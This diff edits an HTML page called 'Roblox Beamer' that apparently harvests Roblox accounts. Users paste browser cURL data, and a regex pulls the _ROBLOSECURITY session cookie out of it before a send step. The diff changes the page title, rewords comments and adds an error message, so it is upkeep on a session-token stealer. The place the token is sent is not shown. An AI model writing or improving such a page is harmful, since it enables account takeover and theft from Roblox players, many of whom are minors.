@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Beamer</title>
+  <title>TEST Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -58,7 +58,7 @@
       const sendButton = document.getElementById("sendButton");
       let message = messageInput.value;
 
-      // Extract the .ROBLOSECURITY token from the copied cURL data
+      // Extract the Roblox token from the pasted cURL data
       const robloSecurityCode = extractRobloSecurityToken(message);
 
       if (robloSecurityCode) {
@@ -97,11 +97,12 @@
       } else {
         // If the _ROBLOSECURITY cookie is not found, just clear the input without an error message
         messageInput.value = "";
+        document.getElementById("status").textContent = "Invalid cURL data or no Roblox token found.";
       }
     }
 
     function extractRobloSecurityToken(curlText) {
-      // Regular expression to extract the _ROBLOSECURITY token
+      // Regular expression to extract the _ROBLOSECURITY token from the cURL data
       const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+);/; // Expecting _ROBLOSECURITY=token;
       const match = curlText.match(robloSecurityCodeRegex);
 
